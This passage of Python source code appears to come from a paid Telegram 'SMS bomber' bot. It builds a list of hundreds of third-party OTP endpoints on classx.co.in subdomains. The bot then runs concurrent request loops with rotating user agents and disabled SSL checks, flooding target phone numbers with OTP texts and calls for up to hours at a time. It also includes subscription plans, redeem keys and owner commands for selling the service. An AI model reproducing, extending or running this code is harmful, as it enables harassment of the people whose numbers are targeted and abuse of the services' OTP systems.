        {"name": "Whatzbehind", "api": "https://whatzbehindapi.classx.co.in"},
        {"name": "Whiteboardacademy", "api": "https://whiteboardacademyapi.classx.co.in"},
        {"name": "Wingsekudaan", "api": "https://wingsekudaanapi.classx.co.in"},
        {"name": "Winias", "api": "https://winiasapi.classx.co.in"},
        {"name": "Winnerhubclasses", "api": "https://winnerhubclassesapi.classx.co.in"},
        {"name": "Winners", "api": "https://winnersinstituteapi.classx.co.in"},
        {"name": "Winnersclasses", "api": "https://winnersclassesapi.classx.co.in"},
        {"name": "Winnerspublications", "api": "https://winnerspublicationsapi.classx.co.in"},
        {"name": "Winnerstest", "api": "https://winnerstestapi.classx.co.in"},
        {"name": "Winnersworld", "api": "https://winnersworldapi.classx.co.in"},
        {"name": "Winningways", "api": "https://winningwaysapi.classx.co.in"},
        {"name": "Winrrb", "api": "https://winrrbapi.classx.co.in"},
        {"name": "Xambites", "api": "https://xambitesapi.classx.co.in"},
        {"name": "Xploreacademy", "api": "https://xploracademyapi.classx.co.in"},
        {"name": "Yashadaacademypune", "api": "https://yashadaacademypuneapi.classx.co.in"},
        {"name": "Yashashriiacademy", "api": "https://yashashriiacademyapi.classx.co.in"},
        {"name": "Yashmaheshwari", "api": "https://yashmaheshwariapi.classx.co.in"},
        {"name": "Yashpatelknowledge", "api": "https://yashpatelknowledgeapi.classx.co.in"},
        {"name": "Yashwantacademypune", "api": "https://yashwantacademypuneapi.classx.co.in"},
        {"name": "Ybdacademy", "api": "https://ybdacademyapi.classx.co.in"},
        {"name": "Yctfastbook", "api": "https://yctfastbookapi.classx.co.in"},
        {"name": "Yesandyesexamsadda", "api": "https://yesexamsaddaapi.classx.co.in"},
        {"name": "Yescompetitiveexamslibrary", "api": "https://yescompetitiveexamslibraryapi.classx.co.in"},
        {"name": "Yesofficer", "api": "https://yesofficerapi.classx.co.in"},
        {"name": "Yespoliceacademy", "api": "https://yespoliceacademyapi.classx.co.in"},
        {"name": "Yodha", "api": "https://yodhaapi.classx.co.in"},
        {"name": "Yodhaapp", "api": "https://yodhaappapi.classx.co.in"},
        {"name": "Yogenderkadyansacademy", "api": "https://yogenderkadyanapi.classx.co.in"},
        {"name": "Yourstudy", "api": "https://yourstudyapi.classx.co.in"},
        {"name": "Yoursuccessmate", "api": "https://yoursuccessmateapi.classx.co.in"},
        {"name": "Yspliveclass", "api": "https://yspliveclassapi.classx.co.in"},
        {"name": "Yugandharacademy", "api": "https://yugandharacademyapi.classx.co.in"},
        {"name": "Yugantaracademyupsc", "api": "https://yugantaracademyapi.classx.co.in"},
        {"name": "Yuktipublication", "api": "https://yuktipublicationapi.classx.co.in"},
        {"name": "Yuvaiasacademyofficial", "api": "https://yuvaiasacademyofficialapi.classx.co.in"},
        {"name": "Yuvaupnishadfoundation", "api": "https://yuvaupnishadfoundationonlineapi.classx.co.in"},
        {"name": "Zidacademyhisar", "api": "https://zidacademyhisarapi.classx.co.in"},
        {"name": "Zinmatt", "api": "https://zinmattapi.classx.co.in"},
        {"name": "Zitaenglishacademy", "api": "https://zitaenglishacademyapi.classx.co.in"},
        {"name": "Zscore", "api": "https://zscoreapi.classx.co.in"}
    ]

    # Convert to the standard API format
    # These ClassX APIs typically have these endpoints:
    # - /api/v2/get-all-course
    # - /api/v2/get-course-details
    # - /api/v2/send-otp (most have this)
    # We'll use /api/v2/send-otp as the primary OTP endpoint
    result = []
    for item in raw_list:
        api_url = item["api"].rstrip("/")
        # Skip if URL is malformed
        if not api_url.startswith("http"):
            continue

        # Create OTP API entry
        result.append({
            "name": f"{item['name']}_OTP",
            "url": f"{api_url}/api/v2/send-otp",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "okhttp/4.9.0",
                "Accept": "application/json"
            },
            "body": {
                "phone": "{no}",
                "mobile": "{no}",
                "phoneNumber": "{no}",
                "countryCode": "+91",
                "mobile_number": "{no}"
            }
        })

        # Create a course API entry (will mostly fail but that's expected)
        result.append({
            "name": f"{item['name']}_COURSE",
            "url": f"{api_url}/api/v2/get-all-course",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "okhttp/4.9.0"
            },
            "body": {}
        })

        # Create login API entry
        result.append({
            "name": f"{item['name']}_LOGIN",
            "url": f"{api_url}/api/v2/get_all_course",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "okhttp/4.9.0"
            },
            "body": {}
        })

    return result


# Build the full API list
APIS = build_api_list() + build_classx_api_list()

# Deduplicate
_seen = set()
_unique_apis = []
for api in APIS:
    key = f"{api.get('url','')}_{api.get('method','')}"
    if key not in _seen:
        _seen.add(key)
        _unique_apis.append(api)
APIS = _unique_apis

logger.info(f"✅ Total APIs Loaded: {len(APIS)}")


# ========== DATABASE WRAPPER ==========
class DatabaseWrapper:
    def __init__(self):
        self.db = db

    def __getattr__(self, name):
        return getattr(self.db, name)


database = DatabaseWrapper()
manager = None


# ========== ATTACK MANAGER ==========
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.db = database
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Dalvik/2.1.0 (Linux; U; Android 9; Pixel 4 Build/PQ3A.190801.002)",
            "okhttp/3.9.1",
            "okhttp/5.0.0-alpha.2",
        ]
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self._session = None
        self._connector = None

    async def _get_session(self):
        if self._session is None or self._session.closed:
            self._connector = aiohttp.TCPConnector(
                ssl=self.ssl_context, limit=100, limit_per_host=20,
                ttl_dns_cache=300, enable_cleanup_closed=True
            )
            timeout = aiohttp.ClientTimeout(total=20, connect=8, sock_read=15)
            self._session = aiohttp.ClientSession(connector=self._connector, timeout=timeout)
        return self._session

    async def _close_session(self):
        if self._session and not self._session.closed:
            await self._session.close()
        if self._connector and not self._connector.closed:
            await self._connector.close()
        self._session = None
        self._connector = None

    async def _make_request(self, api, phone):
        try:
            session = await self._get_session()
            url = api['url']
            if callable(url):
                url = url(phone)

            params = api.get('params', {}).copy() if api.get('params') else {}
            if params:
                for k, v in params.items():
                    if isinstance(v, str):
                        params[k] = v.replace('{no}', phone).replace('{phone}', phone)

            headers = api.get('headers', {}).copy()
            if 'User-Agent' not in headers:
                headers['User-Agent'] = random.choice(self.user_agents)
            def rb(body):
                if isinstance(body, dict):
                    return {k: rb(v) if isinstance(v, (dict, list)) else (v.replace('{no}', phone).replace('{phone}', phone) if isinstance(v, str) else v) for k, v in body.items()}
                elif isinstance(body, list):
                    return [rb(i) if isinstance(i, (dict, list)) else (i.replace('{no}', phone).replace('{phone}', phone) if isinstance(i, str) else i) for i in body]
                elif isinstance(body, str):
                    return body.replace('{no}', phone).replace('{phone}', phone)
                return body

            body = rb(api.get('body', {}))
            method = api['method'].upper()

            if method == 'GET':
                async with session.get(url, headers=headers, params=params) as resp:
                    await resp.text()
            elif method == 'PUT':
                async with session.put(url, headers=headers, json=body) as resp:
                    await resp.text()
            else:
                if isinstance(body, dict):
                    async with session.post(url, headers=headers, json=body, params=params) as resp:
                        await resp.text()
                else:
                    async with session.post(url, headers=headers, data=body, params=params) as resp:
                        await resp.text()
            return True
        except Exception:
            return False

    async def _worker_task(self, user_id, phone, api_list, end_time):
        while time.time() < end_time:
            if user_id not in self.active_attacks:
                break
            if not self.active_attacks[user_id].get("running", False):
                break
            if phone not in self.active_attacks[user_id].get("targets", []):
                break
            batch_size = min(30, len(api_list))
            batch = random.sample(api_list, batch_size) if len(api_list) > batch_size else api_list
            tasks = [self._make_request(api, phone) for api in batch]
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0.05)

    async def start_attack(self, user_id, targets, duration_minutes):
        if user_id in self.active_attacks:
            return False, "Attack already running"
        if not await self.db.is_premium(user_id):
            return False, "Premium required"
        max_dur = await self.db.get_max_duration(user_id)
        if duration_minutes > max_dur:
            return False, f"Max duration is {max_dur} minutes"
        concurrency = await self.db.get_concurrent_limit(user_id)
        if concurrency == 0:
            return False, "Premium required"
        if len(targets) > concurrency:
            return False, f"Max {concurrency} concurrent targets allowed"
        for target in targets:
            if await self.db.is_protected(target):
                return False, f"Number {target} is protected!"

        end_time = time.time() + (duration_minutes * 60)
        max_workers = min(concurrency * 2, 10)
        self.active_attacks[user_id] = {"targets": targets, "end_time": end_time, "running": True, "workers": {}}

        chunk_size = max(1, len(APIS) // max_workers)
        chunks = []
        for i in range(max_workers):
            s = i * chunk_size
            e = s + chunk_size if i < max_workers - 1 else len(APIS)
            chunks.append(APIS[s:e])

        for target in targets:
            self.active_attacks[user_id]["workers"][target] = []
            for i in range(max_workers):
                task = asyncio.create_task(self._worker_task(user_id, target, chunks[i], end_time))
                self.active_attacks[user_id]["workers"][target].append(task)

        return True, f"Started attack on {len(targets)} target(s)"

    async def stop_attack(self, user_id):
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
            for tw in self.active_attacks[user_id].get("workers", {}).values():
                for t in tw:
                    if not t.done():
                        t.cancel()
            await asyncio.sleep(0.5)
            del self.active_attacks[user_id]
            await self._close_session()
            return True
        return False

    async def check_working_apis(self, phone="9999999999"):
        working = []
        failed = []
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=20, limit_per_host=5)
        timeout = aiohttp.ClientTimeout(total=10, connect=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tested = 0
            for api in APIS:
                tested += 1
                try:
                    url = api['url']
                    if callable(url):
                        url = url(phone)
                    headers = api.get('headers', {}).copy()
                    if 'User-Agent' not in headers:
                        headers['User-Agent'] = random.choice(self.user_agents)

                    def rb(body):
                        if isinstance(body, dict):
                            return {k: rb(v) if isinstance(v, (dict, list)) else (v.replace('{no}', phone).replace('{phone}', phone) if isinstance(v, str) else v) for k, v in body.items()}
                        elif isinstance(body, list):
                            return [rb(i) if isinstance(i, (dict, list)) else (i.replace('{no}', phone).replace('{phone}', phone) if isinstance(i, str) else i) for i in body]
                        elif isinstance(body, str):
                            return body.replace('{no}', phone).replace('{phone}', phone)
                        return body

                    body = rb(api.get('body', {}))
                    params = api.get('params', {}).copy() if api.get('params') else {}
                    if params:
                        for k, v in params.items():
                            if isinstance(v, str):
                                params[k] = v.replace('{no}', phone)
                    method = api['method'].upper()

                    if method == 'GET':
                        async with session.get(url, headers=headers, params=params) as resp:
                            if resp.status == 200:
                                working.append(api['name'])
                            else:
                                failed.append(api['name'])
                    elif method == 'PUT':
                        async with session.put(url, headers=headers, json=body) as resp:
                            if resp.status == 200:
                                working.append(api['name'])
                            else:
                                failed.append(api['name'])
                    else:
                        if isinstance(body, dict):
                            async with session.post(url, headers=headers, json=body, params=params) as resp:
                                if resp.status == 200:
                                    working.append(api['name'])
                                else:
                                    failed.append(api['name'])
                        else:
                            async with session.post(url, headers=headers, data=body, params=params) as resp:
                                if resp.status == 200:
                                    working.append(api['name'])
                                else:
                                    failed.append(api['name'])
                except Exception:
                    failed.append(api['name'])
                if tested % 10 == 0:
                    await asyncio.sleep(0.3)
        return working, failed


# ========== BOT HANDLERS ==========
async def check_channel_join(update, context):
    uid = update.effective_user.id
    if uid == OWNER_ID:
        return True
    channel = await manager.db.get_channel()
    if not channel:
        return True
    c = channel.strip()
    for pfx in ["https://", "http://", "t.me/"]:
        if c.startswith(pfx):
            c = c.replace(pfx, "", 1)
    c = c.lstrip("@").split("?")[0].split("/")[0].strip()
    if not c:
        return True
    try:
        m = await context.bot.get_chat_member(c, uid)
        if m.status in ("member", "administrator", "creator"):
            return True
    except Exception:
        pass
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{c}")]])
    msg = f"⛔ ACCESS DENIED!\n\n❌ Aapko hamara channel join karna hoga:\n\n👉 t.me/{c}\n\n✅ Join ke baad /start dobara dabayein."
    try:
        if update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.reply_text(msg, reply_markup=kb)
        else:
            await update.message.reply_text(msg, reply_markup=kb)
    except Exception:
        pass
    return False


async def web_server():
    from aiohttp import web
    async def handle(request):
        return web.Response(text="Bot is Alive!")
    app = web.Application()
    app.router.add_get('/', handle)
    app.router.add_get('/health', lambda r: web.Response(text="OK"))
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"🌐 Web Server running on port {PORT}")


def main_kb(user_id):
    kb = [
        [KeyboardButton("🚀 /mix"), KeyboardButton("📊 /status")],
        [KeyboardButton("👤 /account"), KeyboardButton("💳 /plan")],
        [KeyboardButton("🛡 /protect"), KeyboardButton("🔓 /unprotect")],
        [KeyboardButton("🔑 /redeem"), KeyboardButton("📩 /contact")],
        [KeyboardButton("❓ /help")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton("👑 Admin")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)


async def multi_target_kb(user_id):
    max_t = await manager.db.get_concurrent_limit(user_id)
    btns = [[InlineKeyboardButton(f"🎯 {i} Target(s)", callback_data=f"targets_{i}")] for i in range(1, min(max_t, 10) + 1)]
    btns.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(btns)


async def duration_kb(user_id):
    max_d = await manager.db.get_max_duration(user_id)
    con = await manager.db.get_concurrent_limit(user_id)
    btns = []
    row = []
    for m in [1, 5, 15, 30, 60, 120, 180, 240, 300, 360, 480, 600, 720]:
        if m <= max_d:
            label = f"{m}min" if m < 60 else ("1h" if m == 60 else f"{m//60}h")
            row.append(InlineKeyboardButton(label, callback_data=f"dur_{m}"))
            if len(row) == 3:
                btns.append(row)
                row = []
    if row:
        btns.append(row)
    btns.append([InlineKeyboardButton(f"⚡ {con}x Concurrent", callback_data="info")])
    btns.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
    return InlineKeyboardMarkup(btns)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    await manager.db.add_user(uid)
    await update.message.reply_photo(
        WELCOME_IMAGE,
        caption=f"🔥 Welcome to Premium Multi-Target Bomber!\n\n📡 Total APIs: {len(APIS)}\n🎯 SMS + Call + WhatsApp\n\nUse /help for commands.",
        reply_markup=main_kb(uid)
    )


async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if not await manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium Required!\nUse /plan or /redeem")
        return
    if uid in manager.active_attacks:
        await update.message.reply_text("⚠️ Attack already running! Use /status")
        return
    max_t = await manager.db.get_concurrent_limit(uid)
    await update.message.reply_text(f"📞 Select targets (Max: {max_t}):", reply_markup=await multi_target_kb(uid))
    context.user_data['waiting_for_target_count'] = True


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if uid in manager.active_attacks:
        i = manager.active_attacks[uid]
        left = int((i['end_time'] - time.time()) / 60)
        await update.message.reply_text(
            f"🔥 ATTACK RUNNING\n🎯 Targets: {', '.join(i['targets'])}\n📊 Count: {len(i['targets'])}\n⏳ Left: {left} min",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP", callback_data="stop")]])
        )
    else:
        await update.message.reply_text("💤 No active attacks.")


async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    plan = await manager.db.get_plan_name(uid)
    expiry = await manager.db.get_expiry(uid)
    con = await manager.db.get_concurrent_limit(uid)
    max_d = await manager.db.get_max_duration(uid)
    await update.message.reply_text(
        f"👤 ACCOUNT\n🆔 {uid}\n📋 Plan: {plan}\n📅 Expiry: {expiry}\n⚡ Targets: {con}\n⏰ Max: {max_d}min"
    )


async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_join(update, context):
        return
    msg = "💳 AVAILABLE PLANS\n\n"
    for k, p in PLANS.items():
        msg += f"🔹 {p['name']} (₹{p['price']})\n   • {p['days']} Days\n   • {p['concurrent']} Concurrent\n   • {p['max_duration']}min Max\n\n"
    msg += "💡 Use /redeem or /contact"
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("📩 Contact Admin", callback_data="contact_admin")]])
    await update.message.reply_text(msg, reply_markup=kb)


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_join(update, context):
        return
    await update.message.reply_text("🔑 Send your code (Format: PREMIUM-XXXXXXXX):")
    context.user_data['waiting_for_redeem'] = True


async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if not await manager.db.is_premium(uid):
        await update.message.reply_text("⛔ Premium required!")
        return
    await update.message.reply_text("🛡 Send 10-digit number to protect:")
    context.user_data['waiting_for_protect'] = True


async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    await manager.db.unprotect(uid)
    await update.message.reply_text("🔓 Unprotected.")


async def contact_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    if await manager.db.is_contact_blocked(uid):
        await update.message.reply_text("🚫 You are blocked.")
        return
    await update.message.reply_text("📩 Send your message. /cancel to cancel.")
    context.user_data['waiting_for_contact_msg'] = True


async def reply_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    args = context.args
    if not args or len(args) < 2:
        await update.message.reply_text("Usage: /reply <user_id> <message>")
        return
    tid = args[0]
    msg = " ".join(args[1:])
    if not tid.isdigit():
        await update.message.reply_text("❌ Invalid user ID.")
        return
    try:
        await context.bot.send_message(int(tid), f"📬 Admin Reply:\n\n{msg}")
        await update.message.reply_text(f"✅ Sent to {tid}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed: {e}")


async def inbox_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    pending = await manager.db.get_pending_contacts()
    if not pending:
        await update.message.reply_text("📭 No pending messages.")
        return
    for m in pending[:5]:
        text = f"📩 MSG #{m['id']}\n👤 {m['user_id']}\n💬 {m['message']}\n\nReply: /reply {m['user_id']} <msg>"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Mark Replied", callback_data=f"mark_replied_{m['id']}")],
            [InlineKeyboardButton("🚫 Block User", callback_data=f"block_user_{m['user_id']}")]
        ])
        await update.message.reply_text(text, reply_markup=kb)


async def unblock_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: /unblock <user_id>")
        return
    await manager.db.unblock_contact(int(args[0]))
    await update.message.reply_text(f"✅ Unblocked {args[0]}")


async def giveplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        await update.message.reply_text("⛔ Admin only.")
        return
    args = context.args
    if not args or len(args) < 3:
        await update.message.reply_text(
            "📖 **Usage:** `/giveplan <user_id> <plan> <days>`\n\n"
            "**Examples:**\n"
            "• `/giveplan 123456789 standard 30`\n"
            "• `/giveplan 123456789 premium 30`\n"
            "• `/giveplan 123456789 ultimate 90`\n\n"
            "**Plans:** standard, premium, ultimate",
            parse_mode="Markdown"
        )
        return
    try:
        tid = int(args[0])
        plan_type = args[1].lower()
        days = int(args[2])
        if plan_type not in PLANS:
            await update.message.reply_text("❌ Invalid plan! Use: standard, premium, ultimate")
            return
        if days <= 0 or days > 3650:
            await update.message.reply_text("❌ Days must be 1-3650.")
            return

        await manager.db.add_user(tid)
        exp = await manager.db.add_premium(tid, days, plan_type)
        p = PLANS[plan_type]

        await update.message.reply_text(
            f"✅ **PLAN ACTIVATED!**\n\n"
            f"👤 User: `{tid}`\n"
            f"📋 Plan: **{p['name']}**\n"
            f"📅 Days: {days}\n"
            f"📆 Expiry: `{exp[:10]}`\n"
            f"⚡ Concurrent: {p['concurrent']}\n"
            f"⏰ Max Duration: {p['max_duration']}min",
            parse_mode="Markdown"
        )

        try:
            await context.bot.send_message(
                tid,
                f"🎉 **PREMIUM ACTIVATED!**\n\n"
                f"👑 Admin has activated your plan!\n\n"
                f"📋 Plan: **{p['name']}**\n"
                f"📅 Days: {days}\n"
                f"📆 Expiry: `{exp[:10]}`\n"
                f"⚡ Concurrent: {p['concurrent']}\n"
                f"⏰ Max: {p['max_duration']}min\n\n"
                f"🚀 Use /mix to start!",
                parse_mode="Markdown"
            )
        except Exception:
            pass
    except ValueError:
        await update.message.reply_text("❌ Invalid numbers.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    users = await manager.db.get_all_users_with_plan()
    if not users:
        await update.message.reply_text("📭 No users yet.")
        return
    page = 1
    if context.args and context.args[0].isdigit():
        page = int(context.args[0])
    per_page = 20
    total = len(users)
    total_p = (total + per_page - 1) // per_page
    start = (page - 1) * per_page
    p_users = users[start:start + per_page]

    msg = f"📋 **USERS** (Page {page}/{total_p})\n👥 Total: **{total}**\n━━━━━━━━━━━━━━━\n\n"
    now = datetime.now()
    for u in p_users:
        plan = "Free"
        exp_s = "N/A"
        if u.get('premium_expiry'):
            try:
                e = datetime.fromisoformat(u['premium_expiry'])
                if e > now:
                    plan = (u.get('premium_plan') or 'standard').upper()
                    exp_s = f"{(e - now).days}d"
                else:
                    plan = "Expired"
            except Exception:
                pass
        msg += f"🆔 `{u['user_id']}` - {plan} ({exp_s})\n"

    if total_p > 1:
        msg += f"\n📄 Next: `/users {page + 1}`" if page < total_p else ""
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 Give Plan", callback_data="adm_give_plan")],
        [InlineKeyboardButton("🔄 Refresh", callback_data="adm_users_refresh")]
    ])
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb)


async def userinfo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: /userinfo <user_id>")
        return
    tid = int(args[0])
    user = await manager.db.get_user(tid)
    if not user:
        await update.message.reply_text(f"❌ User {tid} not found.")
        return
    plan = await manager.db.get_plan_name(tid)
    exp = await manager.db.get_expiry(tid)
    con = await manager.db.get_concurrent_limit(tid)
    md = await manager.db.get_max_duration(tid)
    prot = user.get('protected_number') or "None"
    msg = (f"👤 **USER INFO**\n━━━━━━━━━━━━━━━\n\n"
           f"🆔 `{tid}`\n📋 Plan: **{plan}**\n📅 Expiry: `{exp}`\n"
           f"⚡ Concurrent: {con}\n⏰ Max: {md}min\n🛡 Protected: `{prot}`\n"
           f"📆 Joined: `{(user.get('created_at') or 'N/A')[:10]}`")
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 Give Plan", callback_data=f"give_plan_user_{tid}")],
        [InlineKeyboardButton("❌ Remove Plan", callback_data=f"remove_plan_user_{tid}")],
        [InlineKeyboardButton("🚫 Block User", callback_data=f"block_user_{tid}")]
    ])
    await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=kb)


async def removeplan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Usage: /removeplan <user_id>")
        return
    tid = int(args[0])
    if not await manager.db.get_user(tid):
        await update.message.reply_text(f"❌ User {tid} not found.")
        return
    await manager.db.remove_premium(tid)
    await update.message.reply_text(f"✅ Plan removed for `{tid}`", parse_mode="Markdown")
    try:
        await context.bot.send_message(tid, "⚠️ Your premium plan has been removed by admin.")
    except Exception:
        pass


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_channel_join(update, context):
        return
    uid = update.effective_user.id
    msg = f"""ℹ️ **HELP**

🚀 **USER COMMANDS**
• /start - Main menu
• /mix - Start attack
• /status - Attack status
• /account - Your account
• /plan - View plans
• /redeem - Activate code
• /protect & /unprotect
• /contact - Message admin

💡 **Total APIs: {len(APIS)}**"""

    if uid == OWNER_ID:
        msg += """

👑 **ADMIN COMMANDS**
• /giveplan <uid> <plan> <days>
• /users - List all users
• /userinfo <uid> - User details
• /removeplan <uid> - Remove plan
• /inbox - Contact messages
• /reply <uid> <msg>
• /unblock <uid>

🎁 **Examples:**
`/giveplan 123456789 standard 30`
`/giveplan 123456789 premium 30`
`/giveplan 123456789 ultimate 90`"""

    await update.message.reply_text(msg, reply_markup=main_kb(uid), parse_mode="Markdown")


async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🎁 Give Plan to User", callback_data="adm_give_plan")],
        [InlineKeyboardButton("📋 View All Users", callback_data="adm_users_list")],
        [InlineKeyboardButton("🔑 Gen Standard Key", callback_data="adm_gen_standard")],
        [InlineKeyboardButton("⭐ Gen Premium Key", callback_data="adm_gen_premium")],
        [InlineKeyboardButton("👑 Gen Ultimate Key", callback_data="adm_gen_ultimate")],
        [InlineKeyboardButton("🔧 Custom Key", callback_data="adm_custom_key")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📊 Statistics", callback_data="adm_stats")],
        [InlineKeyboardButton("📣 Set Channel", callback_data="adm_set_channel")],
        [InlineKeyboardButton("🗑 Remove Channel", callback_data="adm_remove_channel")],
        [InlineKeyboardButton("🔍 Check APIs", callback_data="adm_check_apis")],
        [InlineKeyboardButton("📥 Contact Inbox", callback_data="adm_inbox")],
        [InlineKeyboardButton("🚫 Blocked Users", callback_data="adm_blocked_users")]
    ])
    await update.message.reply_text("👑 **Admin Panel:**", parse_mode="Markdown", reply_markup=kb)


async def generate_key_logic(update, context, text):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    context.user_data['waiting_for_genkey'] = False
    try:
        parts = text.split()
        days = int(parts[0])
        plan = parts[1].lower() if len(parts) > 1 else "standard"
        if plan not in PLANS:
            plan = "standard"
        code = await manager.db.generate_code(days, plan)
        await update.message.reply_text(
            f"✅ **KEY GENERATED**\n\n🔑 `{code}`\n📅 {days}d\n📋 {plan.upper()}",
            parse_mode="Markdown"
        )
    except Exception:
        await update.message.reply_text("❌ Format: `days plan`\nExample: `30 premium`", parse_mode="Markdown")


async def broadcast_logic(update, context, text):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    context.user_data['waiting_for_broadcast'] = False
    users = await manager.db.get_all_users()
    ok, fail = 0, 0
    msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)}...")
    for u in users:
        try:
            await context.bot.send_message(u, f"📢 **ANNOUNCEMENT**\n\n{text}", parse_mode="Markdown")
            ok += 1
        except Exception:
            fail += 1
            await asyncio.sleep(0.05)
    await msg.edit_text(f"✅ Broadcast Done\n✅ {ok}\n❌ {fail}")


async def process_numbers(update, context, text):
    uid = update.effective_user.id
    nums = [n.strip() for n in text.replace(',', ' ').split() if n.strip().isdigit() and len(n.strip()) == 10]
    cnt = context.user_data.get('expected_targets', 0)
    if len(nums) != cnt:
        await update.message.reply_text(f"❌ Send exactly {cnt} numbers.")
        return
    context.user_data['waiting_for_numbers'] = False
    manager.db.set_attack_data(uid, nums)
    md = await manager.db.get_max_duration(uid)
    await update.message.reply_text(
        f"📞 Targets: {', '.join(nums)}\n⏰ Duration (Max: {md}min):",
        reply_markup=await duration_kb(uid)
    )


async def handle_msg(update, context):
    uid = update.effective_user.id
    if not await check_channel_join(update, context):
        return
    text = update.message.text

    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
        await generate_key_logic(update, context, text)
        return
    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
        await broadcast_logic(update, context, text)
        return
    if uid == OWNER_ID and context.user_data.get('waiting_for_channel'):
        context.user_data['waiting_for_channel'] = False
        c = text.strip().strip('@')
        if 't.me/' in c:
            c = c.split('t.me/')[-1]
        c = c.split('?')[0].split('/')[0].strip()
        if not c:
            await update.message.reply_text("❌ Invalid channel!")
            return
        await manager.db.set_channel(c)
        await update.message.reply_text(f"✅ Channel set: @{c}")
        return

    if context.user_data.get('waiting_for_contact_msg'):
        context.user_data['waiting_for_contact_msg'] = False
        if await manager.db.is_contact_blocked(uid):
            await update.message.reply_text("🚫 Blocked.")
            return
        mid = await manager.db.add_contact_message(uid, text)
        await update.message.reply_text(f"✅ Message sent! ID: #{mid}")
        try:
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Mark Replied", callback_data=f"mark_replied_{mid}")],
                [InlineKeyboardButton("🚫 Block User", callback_data=f"block_user_{uid}")]
            ])
            await context.bot.send_message(
                OWNER_ID,
                f"📩 **NEW MSG**\n👤 `{uid}`\n💬 {text}\n\nReply: `/reply {uid} <msg>`",
                reply_markup=kb, parse_mode="Markdown"
            )
        except Exception:
            pass
        return

    await manager.db.add_user(uid)

    if text in ("🚀 /mix", "/mix"):
        await mix_command(update, context)
